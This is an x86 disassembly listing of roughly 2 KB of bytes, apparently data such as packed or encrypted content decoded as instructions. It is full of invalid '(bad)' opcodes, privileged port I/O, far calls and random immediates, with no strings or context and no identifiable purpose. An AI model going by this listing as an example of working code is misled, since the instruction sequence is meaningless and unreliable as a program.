  4119c6:	out    dx,al
  4119c7:	gs icebp 
  4119c9:	push   ebx
  4119ca:	sub    BYTE PTR [esi+eiz*8+0x2b64ef41],cl
  4119d1:	adc    cl,0xb3
  4119d4:	call   0xe456:0x9493953d
  4119db:	and    eax,0x98f2d9c2
  4119e0:	and    BYTE PTR [ebp+0x6e],ah
  4119e3:	lea    esi,[ebx-0x4d]
  4119e6:	in     eax,0xb9
  4119e8:	pop    edx
  4119e9:	f2xm1  
  4119eb:	ins    BYTE PTR es:[edi],dx
  4119ec:	mov    eax,esi
  4119ee:	mov    WORD PTR [ebp-0x52febdcb],es
  4119f4:	sar    DWORD PTR [ebx+0xf968f50],0xc5
  4119fb:	sbb    ah,BYTE PTR [edi+0x4ebac7ad]
  411a01:	jmp    0xbc1c70ba
  411a06:	push   ecx
  411a07:	aas    
  411a08:	ja     0x411a4c
  411a0a:	lods   al,BYTE PTR ds:[esi]
  411a0b:	inc    edi
  411a0c:	cmp    al,BYTE PTR [ebx]
  411a0e:	not    BYTE PTR [eax]
  411a10:	xor    al,0xf4
  411a12:	sbb    al,0x29
  411a14:	dec    edi
  411a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a16:	mov    dh,0x58
  411a18:	out    0xba,al
  411a1a:	adc    BYTE PTR [eax],al
  411a1c:	test   eax,0x7757d345
  411a21:	(bad)  
  411a22:	sahf   
  411a23:	iret   
  411a24:	and    DWORD PTR cs:0x7ba20fbc,edi
  411a2b:	pop    eax
  411a2c:	jle    0x411a58
  411a2e:	fisub  DWORD PTR [edi]
  411a30:	sti    
  411a31:	adc    BYTE PTR [esi+0x6660fb8a],dl
  411a37:	push   ds
  411a38:	inc    ecx
  411a39:	pop    edi
  411a3a:	cmp    eax,0xe049417e
  411a3f:	mov    BYTE PTR [edi],bh
  411a41:	in     al,0x5a
  411a43:	int3   
  411a44:	mov    cs,WORD PTR [ebp+0xf878114]
  411a4a:	adc    DWORD PTR [ebx-0xb32aa1],edi
  411a50:	aad    0x7c
  411a52:	fincstp 
  411a54:	and    ebx,DWORD PTR [edx-0x12]
  411a57:	aad    0x4d
  411a59:	clc    
  411a5a:	popf   
  411a5b:	adc    BYTE PTR [eax+0x5426e47f],dl
  411a61:	test   BYTE PTR [esi+0x4f990e5],ah
  411a67:	cmp    BYTE PTR [esi-0x23],dh
  411a6a:	cmp    BYTE PTR [eax],dl
  411a6c:	sub    esp,DWORD PTR [ecx+0x35]
  411a6f:	lods   al,BYTE PTR ds:[esi]
  411a70:	addr16 pop ds
  411a72:	sbb    ah,BYTE PTR [edx]
  411a74:	std    
  411a75:	dec    ecx
  411a76:	mov    bl,0xae
  411a78:	pop    ebp
  411a79:	xor    DWORD PTR [esi-0x42b90875],0x9acb7411
  411a83:	out    dx,eax
  411a84:	jge    0x411a55
  411a86:	ror    DWORD PTR [ecx+ecx*1-0x51184b8e],cl
  411a8d:	xchg   ebx,eax
  411a8e:	or     ch,BYTE PTR [ebx]
  411a90:	push   esi
  411a91:	popf   
  411a92:	inc    esi
  411a93:	and    ebp,DWORD PTR [ebx+0x64]
  411a96:	jno    0x411a98
  411a98:	add    eax,0x961e5877
  411a9d:	mov    dh,0x20
  411a9f:	mov    ch,BYTE PTR [edi-0x285eb7c]
  411aa5:	push   ebp
  411aa6:	in     eax,0xab
  411aa8:	xchg   ebp,eax
  411aa9:	mov    bh,0xca
  411aab:	sub    BYTE PTR [edi+0xa],ah
  411aae:	inc    esp
  411aaf:	adc    al,0x33
  411ab1:	loope  0x411a51
  411ab3:	mov    ecx,0xac188475
  411ab8:	mul    DWORD PTR [esi]
  411aba:	push   ss
  411abb:	dec    esi
  411abc:	mov    dh,0x53
  411abe:	push   cs
  411abf:	and    BYTE PTR [ebx+0x5cbaac18],al
  411ac5:	fadd   QWORD PTR [ebx-0x60]
  411ac8:	cmp    esi,DWORD PTR [eax+0xf]
  411acb:	xor    DWORD PTR [eax],0xffffffdf
  411ace:	jne    0x411b3f
  411ad0:	jo     0x411adf
  411ad2:	push   edi
  411ad3:	sub    dh,BYTE PTR [ebp-0x7d537843]
  411ad9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ada:	ins    BYTE PTR es:[edi],dx
  411adb:	cmp    al,0x41
  411add:	sub    eax,0x950b93ba
  411ae2:	sbb    eax,0xaf1cdbc5
  411ae7:	push   ecx
  411ae8:	push   cs
  411ae9:	outs   dx,DWORD PTR ds:[esi]
  411aea:	add    BYTE PTR [edi-0x2],0xc6
  411aee:	out    dx,al
  411aef:	test   eax,0xee25c72b
  411af4:	sti    
  411af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411af6:	ins    DWORD PTR es:[edi],dx
  411af7:	adc    eax,0xcd2d0fd5
  411afc:	sar    esp,1
  411afe:	mov    bl,0xfc
  411b00:	and    al,0x87
  411b02:	cmp    dh,al
  411b04:	fwait
  411b05:	pop    ss
  411b06:	mov    ch,0xba
  411b08:	jg     0x411b86
  411b0a:	xor    esp,DWORD PTR [edi+0x0]
  411b0d:	mov    DWORD PTR [ebx+ebp*2-0x134c96d],ebx
  411b14:	sub    BYTE PTR [esi-0xab11867],bl
  411b1a:	retf   0xdf27
  411b1d:	cdq    
  411b1e:	add    DWORD PTR [esi-0x51d84649],ebx
  411b24:	dec    ecx
  411b25:	pop    ds
  411b26:	aad    0x72
  411b28:	(bad)  
  411b29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b2a:	cmp    eax,0xe6510db5
  411b2f:	je     0x411b26
  411b31:	test   eax,0xe351b870
  411b36:	rol    BYTE PTR [edx+0x41346343],1
  411b3c:	cmp    cl,bh
  411b3e:	retf   
  411b3f:	popf   
  411b40:	cmc    
  411b41:	dec    ecx
  411b42:	pop    edi
  411b43:	shl    ah,0x52
  411b46:	clc    
  411b47:	fiadd  DWORD PTR [ebp+0xe622448]
  411b4d:	inc    ecx
  411b4e:	test   dl,0xbd
  411b51:	push   ds
  411b52:	fisub  WORD PTR [ebp-0x71]
  411b55:	lock inc edi
  411b57:	ja     0x411b4f
  411b59:	and    al,0x4e
  411b5b:	ss addr16 adc eax,esi
  411b5f:	je     0x411afb
  411b61:	enter  0x8412,0x6c
  411b65:	jb     0x411af5
  411b67:	cmp    edi,DWORD PTR [eax+0x3b]
  411b6a:	mov    ebp,0xed99e523
  411b70:	mov    esp,0x9425576a
  411b75:	int    0xe3
  411b77:	jl     0x411bb5
  411b79:	imul   edx,DWORD PTR [edi],0x3d093375
  411b7f:	cmc    
  411b80:	jno    0x411ba4
  411b82:	pop    ebx
  411b83:	mov    esi,DWORD PTR ds:0xaed37d83
  411b89:	daa    
  411b8a:	or     eax,0x19193d02
  411b8f:	mov    edi,DWORD PTR [eax]
  411b91:	pop    ebp
  411b92:	ret    0xb78d
  411b95:	mov    ds:0x10bb741a,eax
  411b9a:	or     al,BYTE PTR [eax+0x6e]
  411b9d:	fstp   TBYTE PTR [esi-0x71]
  411ba0:	aad    0xa5
  411ba2:	shld   DWORD PTR [edx+0x7aa78ba4],ebp,0xab
  411baa:	adc    BYTE PTR [edx+edi*4+0x1c],bh
  411bae:	add    BYTE PTR [edi+0x2e5e404b],dl
  411bb4:	das    
  411bb5:	xchg   ecx,eax
  411bb6:	mov    eax,ds:0x4da85e7e
  411bbb:	mov    ss,WORD PTR [eax-0x3d6fed2c]
  411bc1:	mov    ebx,0xb7da953d
  411bc6:	(bad)  
  411bc8:	add    DWORD PTR [edx],esi
  411bca:	cmc    
  411bcb:	js     0x411bcc
  411bcd:	dec    edi
  411bce:	popf   
  411bcf:	scas   al,BYTE PTR es:[edi]
  411bd0:	xor    eax,0x680ad83f
  411bd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bd6:	(bad)
  411bda:	bound  edx,QWORD PTR [esi]
  411bdc:	xchg   ebx,eax
  411bdd:	in     al,0x9f
  411bdf:	adc    eax,0x883597c4
  411be4:	test   DWORD PTR [ecx],esp
  411be6:	neg    edx
  411be8:	pop    edi
  411be9:	mov    dh,0xc2
  411beb:	dec    esp
  411bec:	test   BYTE PTR [eax],bl
  411bee:	sbb    al,0x95
  411bf0:	nop
  411bf1:	(bad)  
  411bf2:	push   ss
  411bf3:	mov    ah,0xc3
  411bf5:	(bad)  
  411bf6:	sbb    al,BYTE PTR [edx+0x7b703e75]
  411bfc:	std    
  411bfd:	ret    
  411bfe:	loop   0x411bfb
  411c00:	(bad)  
  411c01:	cmp    eax,0x121ed43d
  411c06:	lea    esp,[edx-0x40955bba]
  411c0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c0d:	arpl   WORD PTR [ebp-0x28],bp
  411c10:	fcomi  st,st(4)
  411c12:	aam    0xd2
  411c14:	(bad)  
  411c15:	pop    esi
  411c16:	mov    esp,0x68cd2581
  411c1b:	stos   BYTE PTR es:[edi],al
  411c1c:	mov    al,ds:0x1d60986f
  411c21:	mov    al,ds:0xd8d7e32c
  411c26:	push   ebp
  411c27:	je     0x411bdc
  411c29:	loopne 0x411c77
  411c2b:	iret   
  411c2c:	ins    BYTE PTR es:[edi],dx
  411c2d:	cmc    
  411c2e:	pop    ds
  411c2f:	sub    dl,al
  411c31:	retf   0xa578
  411c34:	out    0xb,al
  411c36:	mov    ds:0xbcca2319,al
  411c3b:	fdivrp st(0),st
  411c3d:	out    dx,al
  411c3e:	retf   0xa223
  411c41:	or     al,0x47
  411c43:	enter  0xa8cb,0xb0
  411c47:	inc    esi
  411c48:	rcl    ebx,1
  411c4a:	mov    cl,BYTE PTR [ebx]
  411c4c:	jge    0x411cb1
  411c4e:	adc    ebp,ecx
  411c50:	sbb    BYTE PTR [edx+0x68],0x64
  411c54:	les    ebx,FWORD PTR gs:[esi-0x4753fb55]
  411c5b:	nop
  411c5c:	cmp    dh,cl
  411c5e:	mov    ch,0x5c
  411c60:	je     0x411c16
  411c62:	adc    edi,ebp
  411c64:	push   es
  411c65:	or     al,ah
  411c67:	inc    esi
  411c68:	mov    dh,0x87
  411c6a:	push   esi
  411c6b:	std    
  411c6c:	stos   DWORD PTR es:[edi],eax
  411c6d:	fstp   QWORD PTR [ebp+0x6283c014]
  411c73:	mov    bh,0xa0
  411c75:	adc    al,0x5e
  411c77:	dec    eax
  411c78:	adc    BYTE PTR [edi+0x43],0x4d
  411c7c:	or     edi,edi
  411c7e:	mov    bh,0xba
  411c80:	add    cl,BYTE PTR [edx-0x40]
  411c83:	call   0x4392:0x8aad290e
  411c8a:	pop    ds
  411c8b:	leave  
  411c8c:	add    eax,0xc409f8a8
  411c91:	lock inc ecx
  411c93:	out    0xf2,al
  411c95:	leave  
  411c96:	out    0x94,al
  411c98:	mov    eax,ds:0xdca80f2e
  411c9d:	stos   BYTE PTR es:[edi],al
  411c9e:	add    eax,0x6e36c9a8
  411ca3:	fcomi  st,st(3)
  411ca5:	push   eax
  411ca6:	sbb    dl,BYTE PTR [ebx-0x64]
  411ca9:	and    DWORD PTR [edi],0xe
  411cac:	mov    al,0x7f
  411cae:	(bad)  
  411caf:	aam    0xdc
  411cb1:	sub    al,0xf9
  411cb3:	xchg   ecx,eax
  411cb4:	rcl    DWORD PTR [edx+0x1b],cl
  411cb7:	jbe    0x411cff
  411cb9:	dec    edx
  411cba:	out    0x9,al
  411cbc:	nop
  411cbd:	cmp    ebp,DWORD PTR [ebx]
  411cbf:	mov    BYTE PTR [ebx-0x4e],bh
  411cc2:	xchg   ecx,eax
  411cc3:	or     bl,bl
  411cc5:	std    
  411cc6:	mov    bh,0x2e
  411cc8:	jmp    0x66b8bfd
  411ccd:	xor    dl,BYTE PTR [edx+esi*8]
  411cd0:	mov    ?,WORD PTR [esi-0x5c409542]
  411cd6:	inc    ecx
  411cd7:	das    
  411cd8:	bound  esp,QWORD PTR [esi+ebx*2-0x29]
  411cdc:	aaa    
  411cdd:	mov    ebx,ecx
  411cdf:	adc    eax,0xe663c411
  411ce4:	iret   
  411ce5:	mov    bh,0x81
  411ce7:	mov    DWORD PTR [ebp-0x37343515],eax
  411ced:	imul   ebp,edx,0xb5436aeb
  411cf3:	mov    ah,0xbf
  411cf5:	mov    eax,ecx
  411cf7:	mov    ebp,0x4a0660a0
  411cfc:	imul   ebx,ebp,0x5b
  411cff:	jl     0x411d6d
  411d01:	mov    edx,gs
  411d03:	fsub   QWORD PTR [ecx+0x21b2e5f9]
  411d09:	scas   al,BYTE PTR es:[edi]
  411d0a:	int3   
  411d0b:	pop    ss
  411d0c:	repnz push ebx
  411d0e:	inc    ebx
  411d0f:	aaa    
  411d10:	aad    0x13
  411d12:	jo     0x411d90
  411d14:	adc    bl,BYTE PTR [edx-0x3bd0a46c]
  411d1a:	ds retf 0xde94
  411d1e:	jg     0x411d0c
  411d20:	hlt    
  411d21:	mov    esi,gs
  411d23:	or     dh,BYTE PTR [ebx+0x69]
  411d26:	push   ds
  411d27:	push   esi
  411d28:	call   0x5384:0xdf4656cc
  411d2f:	mov    al,0x78
  411d31:	or     al,0xc3
  411d33:	leave  
  411d34:	push   edx
  411d35:	jmp    0x411d92
  411d37:	bnd jbe 0x411d3c
  411d3a:	outs   dx,BYTE PTR ds:[esi]
  411d3b:	int3   
  411d3c:	pusha  
  411d3d:	into   
  411d3e:	cmp    cl,BYTE PTR [edx]
  411d40:	sub    eax,0xbdbb4256
  411d45:	push   edi
  411d46:	dec    ebp
  411d47:	popf   
  411d48:	pusha  
  411d49:	mov    bl,0xb2
  411d4b:	dec    edi
  411d4c:	push   edi
  411d4d:	retf   0xf3d
  411d50:	and    ebx,ebx
  411d52:	loop   0x411da3
  411d54:	fs xchg esi,eax
  411d56:	cmp    BYTE PTR [edx+0x4e6fc7eb],bh
  411d5c:	fsubr  DWORD PTR [edx+0x734fd336]
  411d62:	rcl    DWORD PTR [esi-0x5c68b224],cl
  411d68:	push   ebp
  411d69:	push   ecx
  411d6a:	add    DWORD PTR ds:0xc1e411cc,0xd3445580
  411d74:	cwde   
  411d75:	pop    ss
  411d76:	mov    bl,0x34
  411d78:	jns    0x411d79
  411d7a:	and    DWORD PTR [ebp-0x7f],0x743e3df1
  411d81:	sbb    eax,ebx
  411d83:	sahf   
  411d84:	and    DWORD PTR [eax-0x7e],ecx
  411d87:	rcr    BYTE PTR [eax+ebx*2-0x2f],1
  411d8b:	outs   dx,BYTE PTR ds:[esi]
  411d8c:	ret    0xaf59
  411d8f:	sub    eax,0xb4cc672a
  411d94:	sub    edi,DWORD PTR [eax-0x66ead9be]
  411d9a:	test   ch,al
  411d9c:	xchg   DWORD PTR [ecx-0x2b],esi
  411d9f:	push   cs
  411da0:	jns    0x411e01
  411da2:	retf   
  411da3:	jbe    0x411d45
  411da5:	inc    ebx
  411da6:	ds enter 0x55a8,0xd7
  411dab:	xchg   esp,eax
  411dac:	aaa    
  411dad:	fcomi  st,st(3)
  411daf:	sub    DWORD PTR [edx],ebp
  411db1:	ret    
  411db2:	aam    0x28
  411db4:	cmp    esi,esp
  411db6:	imul   esp,esi,0xffffffdf
  411db9:	inc    edx
  411dba:	dec    ebp
  411dbb:	lods   eax,DWORD PTR ds:[esi]
  411dbc:	popa   
  411dbd:	dec    ebx
  411dbe:	imul   BYTE PTR [edi]
  411dc0:	cmp    ebp,DWORD PTR [ecx+0x593032e2]
  411dc6:	lods   al,BYTE PTR ds:[esi]
  411dc7:	cmp    al,0xb7
  411dc9:	in     al,0xc5
  411dcb:	xor    edx,DWORD PTR [ebx]
  411dcd:	sub    al,0xed
  411dcf:	dec    ebp
  411dd0:	add    al,0x35
  411dd2:	iret   
  411dd3:	add    eax,0x6ae4a19c
  411dd8:	idiv   BYTE PTR [edi+0x42018b1]
  411dde:	jbe    0x411e5d
  411de0:	ret    
  411de1:	xchg   esp,eax
  411de2:	fwait
  411de3:	mov    eax,ebp
  411de5:	mov    eax,0xa70a9c19
  411dea:	mov    ds:0xc79061f8,al
  411def:	movmskps esp,xmm0
  411df2:	das    
  411df3:	in     eax,0x2a
  411df5:	sar    DWORD PTR [edx+0x5e04646e],cl
  411dfb:	out    dx,eax
  411dfc:	jg     0x411d89
  411dfe:	ret    
  411dff:	and    BYTE PTR [ebp-0x34],cl
  411e02:	dec    esp
  411e03:	adc    al,BYTE PTR [esp+eax*2+0x105e76ef]
  411e0a:	sbb    dl,ah
  411e0c:	lods   eax,DWORD PTR ds:[esi]
  411e0d:	scas   eax,DWORD PTR es:[edi]
  411e0e:	jno    0x411d90
  411e10:	jns    0x411dfa
  411e12:	icebp  
  411e13:	sbb    edx,ebx
  411e15:	xor    al,0xec
  411e17:	stos   DWORD PTR es:[edi],eax
  411e18:	test   edx,esi
  411e1a:	pusha  
  411e1b:	icebp  
  411e1c:	retf   
  411e1d:	dec    ebp
  411e1e:	lock cmovp esp,DWORD PTR [eax*8-0x73599fb0]
  411e27:	push   edi
  411e28:	je     0x411e68
  411e2a:	cmc    
  411e2b:	aaa    
  411e2c:	(bad)  
  411e2d:	daa    
  411e2e:	popf   
  411e2f:	loop   0x411dc3
  411e31:	das    
  411e32:	sbb    eax,0xc37921c8
  411e37:	(bad)  
  411e38:	sahf   
  411e39:	loopne 0x411dcd
  411e3b:	bound  edx,QWORD PTR [ecx-0x701699ae]
  411e41:	rol    BYTE PTR ds:0x6fec2fe5,1
  411e47:	jg     0x411dd4
  411e49:	aam    0xe5
  411e4b:	add    DWORD PTR ds:0x173d0cea,esi
  411e51:	rcr    ebp,1
  411e53:	dec    esp
  411e54:	adc    al,0x0
  411e56:	test   BYTE PTR [esi],0x84
  411e59:	ins    BYTE PTR es:[edi],dx
  411e5a:	push   ecx
  411e5b:	add    al,0x6b
  411e5d:	ss cli 
  411e5f:	adc    dl,ah
  411e61:	inc    eax
  411e62:	xchg   ecx,eax
  411e63:	mov    edi,0x927afcf5
  411e68:	add    eax,0x8ff7cd83
  411e6d:	enter  0xf0bd,0xea
  411e71:	cmc    
  411e72:	mov    ds:0x749ad628,al
  411e77:	(bad)  
  411e79:	inc    ecx
  411e7a:	fstp   QWORD PTR [edx]
  411e7c:	and    edi,esi
  411e7e:	or     DWORD PTR [ecx+0x5d],eax
  411e81:	mov    ah,0x2e
  411e83:	inc    ecx
  411e85:	leave  
  411e86:	xchg   BYTE PTR [ecx-0x9],dl
  411e89:	mov    eax,DWORD PTR [edi+0x2daca43d]
  411e8f:	pushf  
  411e90:	mov    dh,0x9a
  411e92:	add    BYTE PTR [ebp+0x20],al
  411e95:	int3   
  411e96:	mov    ecx,gs
  411e98:	mov    ebx,0xeb5cf23e
  411e9d:	pop    ebx
  411e9e:	ins    DWORD PTR es:[edi],dx
  411e9f:	mov    ?,WORD PTR ds:0xfaa79594
  411ea5:	sub    al,0x7c
  411ea7:	jne    0x411eaf
  411ea9:	cmp    eax,esi
  411eab:	aas    
  411eac:	scas   al,BYTE PTR es:[edi]
  411ead:	loop   0x411f21
  411eaf:	(bad)  
  411eb1:	fcomp  DWORD PTR [eax+eax*8-0x29832f79]
  411eb8:	inc    esp
  411eb9:	add    DWORD PTR [ecx+ebp*1+0x3c],0xd8ca5d60
  411ec1:	retf   0xb921
  411ec4:	mov    ah,0xfd
  411ec6:	add    esi,DWORD PTR [ebx+0x6856ec23]
  411ecc:	push   edi
  411ecd:	mov    esi,0xe7fb8bae
  411ed2:	gs push cs
  411ed4:	outs   dx,DWORD PTR ds:[esi]
  411ed5:	fisttp WORD PTR [edx+0x7de80b50]
  411edb:	mov    edi,0xa946c063
  411ee0:	xchg   ebp,eax
  411ee1:	pop    esi
  411ee2:	bound  ebp,QWORD PTR [esi-0x230f5d7d]
  411ee8:	sbb    al,0xb5
  411eea:	add    dl,BYTE PTR [ebx-0x6da598fc]
  411ef0:	fdiv   DWORD PTR [ebx+0x4a288f5]
  411ef6:	xchg   ebp,eax
  411ef7:	mov    dl,0xf6
  411ef9:	in     al,dx
  411efa:	and    al,BYTE PTR [edi]
  411efc:	pushf  
  411efd:	ja     0x411ed1
  411eff:	xchg   BYTE PTR [eax],bl
  411f01:	hlt    
  411f02:	ins    BYTE PTR es:[edi],dx
  411f03:	sub    DWORD PTR [ebx-0x72],edi
  411f06:	out    0x2b,al
  411f08:	xchg   edx,eax
  411f09:	int    0x8c
  411f0b:	call   0xba02:0xd67dd2c5
  411f12:	sub    eax,0x4d8194a9
  411f17:	mov    ds:0x1bcfd5d,al
  411f1c:	call   0x6f72:0x4bd95881
  411f23:	pop    ebp
  411f24:	rol    BYTE PTR [esi-0x10e69277],0x10
  411f2b:	push   ds
  411f2c:	push   edi
  411f2d:	shl    bh,cl
  411f2f:	jns    0x411ee5
  411f31:	das    
  411f32:	cli    
  411f33:	add    eax,0xd3922bb6
  411f38:	mov    ebx,0xd26efb14
  411f3d:	into   
  411f3e:	sub    al,0xbc
  411f40:	icebp  
  411f41:	lea    esp,[edx-0x24]
  411f44:	xor    esi,edx
  411f46:	in     eax,0xf6
  411f48:	mov    es,WORD PTR ds:0x76031832
  411f4e:	lods   al,BYTE PTR ds:[esi]
  411f4f:	aas    
  411f50:	add    al,bl
  411f52:	test   al,0x8
  411f54:	scas   al,BYTE PTR es:[edi]
  411f55:	lock test esp,0x8cdd93e7
  411f5c:	or     eax,0x35fa7904
  411f61:	loope  0x411f8f
  411f63:	add    DWORD PTR [edi],ecx
  411f65:	adc    al,0x9b
  411f67:	rcl    edi,cl
  411f69:	xor    eax,0x21e8822b
  411f6e:	sbb    ebx,ecx
  411f70:	(bad)  
  411f71:	fs ins BYTE PTR es:[edi],dx
  411f73:	dec    eax
  411f74:	push   0x4b9e7f3f
  411f79:	inc    eax
  411f7a:	add    eax,0x3aa38283
  411f7f:	push   ecx
  411f80:	push   ss
  411f81:	inc    ebx
  411f82:	cmp    DWORD PTR [ebx+esi*8+0x49be4a59],ebx
  411f89:	and    al,0x38
  411f8b:	das    
  411f8c:	fstp   TBYTE PTR [ecx-0x74bfae3]
  411f92:	sub    DWORD PTR [ebx],0x69
  411f95:	mov    bl,bh
  411f97:	mov    es,WORD PTR [esp+ebp*1]
  411f9a:	adc    bl,BYTE PTR [bp+si+0x7d2b]
  411f9f:	sbb    ch,bl
  411fa1:	test   al,0x0
  411fa3:	or     dh,BYTE PTR [esi-0x25a2ffbb]
  411fa9:	xchg   esi,eax
  411faa:	push   ss
  411fab:	ficomp WORD PTR [edx]
  411fad:	bound  eax,QWORD PTR [eax+0x413bd73e]
  411fb3:	jg     0x411fae
  411fb5:	xchg   edx,eax
  411fb6:	or     dl,ch
  411fb8:	mov    esi,0x6b326343
  411fbd:	jmp    0x92e89119
  411fc2:	add    DWORD PTR [eax+0x75],edx
  411fc5:	out    dx,eax
  411fc6:	jecxz  0x411f4e
  411fc8:	push   ecx
  411fc9:	inc    esi
  411fca:	addr16 jbe 0x411f5c
  411fcd:	pop    es
  411fce:	jo     0x412045
  411fd0:	mov    bl,0xf0
  411fd2:	add    eax,0x90b87bf4
  411fd7:	xchg   BYTE PTR [ecx+0x70ece881],dl
  411fdd:	ret    
  411fde:	sub    BYTE PTR [edi],dl
  411fe0:	ds pushf 
  411fe2:	add    eax,0x49d6de31
  411fe7:	adc    al,0x3a
  411fe9:	pop    ebx
  411fea:	jg     0x412034
  411fec:	fsub   QWORD PTR [edi]
  411fee:	push   ebp
  411fef:	fucom  st(6)
  411ff1:	cld    
  411ff2:	jo     0x411ff6
  411ff4:	inc    edx
  411ff5:	adc    esi,DWORD PTR [edx+eax*2+0x46]
  411ff9:	and    BYTE PTR [ecx+0xe],ah
  411ffc:	rcl    BYTE PTR [ebp-0x24],1
  411fff:	mov    ebx,0x400cef54
  412004:	popa   
  412005:	xor    ah,BYTE PTR [ebx+0x2d]
  412008:	mov    ch,0x13
  41200a:	bound  ecx,QWORD PTR [ecx+0x73]
  41200d:	inc    esi
  41200e:	iret   
  41200f:	pop    edi
  412010:	cmp    al,0xf2
  412012:	pop    ebp
  412013:	hlt    
  412014:	or     esi,DWORD PTR [ebx+0x1b]
  412017:	hlt    
  412018:	dec    edi
  412019:	mov    ebp,0xd76524f1
  41201e:	test   DWORD PTR [edi*1+0x34054152],ecx
  412025:	mov    edi,0xb234f500
  41202a:	loope  0x412006
  41202c:	iret   
  41202d:	das    
  41202e:	(bad)  
  41202f:	xlat   BYTE PTR ds:[ebx]
  412030:	fst    DWORD PTR [ebx]
  412032:	stos   BYTE PTR es:[edi],al
  412033:	iret   
  412034:	add    edx,DWORD PTR [eax+eax*2]
  412037:	aaa    
  412038:	adc    al,0x6d
  41203a:	call   0x454150d
  41203f:	inc    ebp
  412040:	lock sub eax,0xd8169433
  412046:	add    eax,eax
  412048:	stos   DWORD PTR es:[edi],eax
  412049:	mov    ch,0xa1
  41204b:	lods   eax,DWORD PTR ds:[esi]
  41204c:	leave  
  41204d:	push   es
  41204e:	push   esp
  41204f:	mov    esi,0x12057f1f
  412054:	jne    0x4120a4
  412056:	jle    0x412011
  412058:	pop    ss
  412059:	jne    0x4120a9
  41205b:	fwait
  41205c:	outs   dx,BYTE PTR ds:[esi]
  41205d:	out    0xf1,al
  41205f:	arpl   WORD PTR [ecx+0x50c40c34],si
  412065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412066:	xchg   edi,eax
  412067:	test   DWORD PTR [ebx-0x71],ebp
  41206a:	push   ecx
  41206b:	arpl   WORD PTR [eax],si
  41206d:	jmp    0x41205e
  41206f:	popf   
  412070:	add    cl,BYTE PTR [ebx]
  412072:	out    dx,eax
  412073:	push   esp
  412074:	push   esi
  412075:	pop    ebp
  412076:	xor    ebx,DWORD PTR [ecx-0x23]
  412079:	adc    al,0x41
  41207b:	mov    ebx,0x9e0efd23
  412080:	shl    BYTE PTR [edi+0x144703d9],cl
  412086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412087:	loop   0x412022
  412089:	pop    esi
  41208a:	push   0xaf61af19
  41208f:	mov    ebx,0x113eaeb6
  412094:	mov    al,0x53
  412096:	out    dx,al
  412097:	inc    esi
  412098:	test   DWORD PTR [edi-0x49451604],0xd93dd06d
  4120a2:	mov    eax,ds:0x7be9472a
  4120a7:	shl    BYTE PTR ss:0xf132f229,cl
  4120ae:	ret    0x8ac0
  4120b1:	adc    DWORD PTR ss:[ebx],0xffffffe7
  4120b5:	outs   dx,DWORD PTR ds:[esi]
  4120b6:	and    al,0x1b
  4120b8:	retf   
  4120b9:	sub    ch,0x67
  4120bc:	loop   0x412131
  4120be:	lds    ebp,FWORD PTR [ecx-0x558772ac]
  4120c4:	js     0x4120a1
  4120c6:	scas   al,BYTE PTR es:[edi]
  4120c7:	add    ecx,ecx
  4120c9:	cmp    eax,0x15e98504
  4120ce:	mov    al,0xd1
  4120d0:	mov    bh,0x7e
  4120d2:	cli    
  4120d3:	dec    esp
  4120d4:	or     ebx,DWORD PTR [ecx+0x67bf8c8b]
  4120da:	jle    0x412133
  4120dc:	mov    ah,0xf1
  4120de:	loopne 0x4120e3
  4120e0:	cmc    
  4120e1:	mov    al,0xd8
  4120e3:	xor    eax,0x7b5bf8db
  4120e8:	icebp  
  4120e9:	clc    
  4120ea:	mov    esi,0xb8598a72
  4120ef:	test   al,0x38
  4120f1:	cmp    DWORD PTR [edx],edi
  4120f3:	pop    ecx
  4120f4:	add    ah,BYTE PTR [ebx-0x2e]
  4120f7:	jmp    0x1ea25195
  4120fc:	cdq    
  4120fd:	add    DWORD PTR [edi-0x1b],0x2a6132f8
  412104:	mov    esp,DWORD PTR [esi-0x7eaa5c80]
  41210a:	sar    BYTE PTR [edx-0x1c988ec0],cl
  412110:	xor    BYTE PTR [edx+0x54],ch
  412113:	cmp    BYTE PTR [esi+0x1d579ecd],dl
  412119:	rol    BYTE PTR [ebp-0x1c],1
  41211c:	lea    esp,[esi+0x1a]
  41211f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412120:	mov    ebx,0x7ac6179c
  412125:	mov    BYTE PTR [si-0x15],bh
  412129:	dec    di
  41212b:	inc    esp
  41212c:	jne    0x41219d
  41212e:	push   cs
  41212f:	nop
  412130:	mov    esp,0x26ed53a2
  412135:	shr    BYTE PTR [eax+eax*8+0x2d8c17b3],0x80
  41213d:	push   ecx
  41213e:	push   ss
  41213f:	mov    edi,0x859ebe60
  412144:	sub    DWORD PTR [ebp-0x4b623642],esp
  41214a:	fimul  WORD PTR cs:[eax+0x5e]
  41214e:	jbe    0x412167
  412150:	dec    ebp
  412151:	cli    
  412152:	rol    BYTE PTR ds:0x1c09db73,1
  412158:	dec    ebp
  412159:	pop    ebp
  41215a:	retf   
  41215b:	ins    DWORD PTR es:[edi],dx
  41215c:	sub    al,0xdb
  41215e:	push   cs
  41215f:	bound  esi,QWORD PTR [ecx+0xe]
  412162:	jae    0x412117
  412164:	bound  edi,QWORD PTR [edi+ebp*2-0x35]
  412168:	and    DWORD PTR [ecx+ecx*1],eax
  41216b:	cmp    ah,dh
  41216d:	repz cwde 
  41216f:	sbb    esi,DWORD PTR fs:[ecx-0x6c]
  412173:	xchg   esp,eax
  412174:	(bad)  
  412175:	lea    ecx,[eax-0x71725e49]
  41217b:	inc    ebp
  41217c:	loop   0x41219a
  41217e:	clc    
  41217f:	adc    edx,DWORD PTR [edx]
  412181:	fs repnz ins BYTE PTR es:[edi],dx
  412184:	sub    al,0xa4
  412186:	push   0x68
  412188:	cmp    bh,BYTE PTR [ebx+0x4d]
  41218b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41218c:	loope  0x41218c
  41218e:	jns    0x4121ff
  412190:	aaa    
  412191:	adc    esp,0x123bd04e
  412197:	leave  
  412198:	loope  0x41218e
  41219a:	add    al,0x16
  41219c:	push   cs
  41219d:	add    DWORD PTR [eax],0x48
  4121a0:	pop    edi
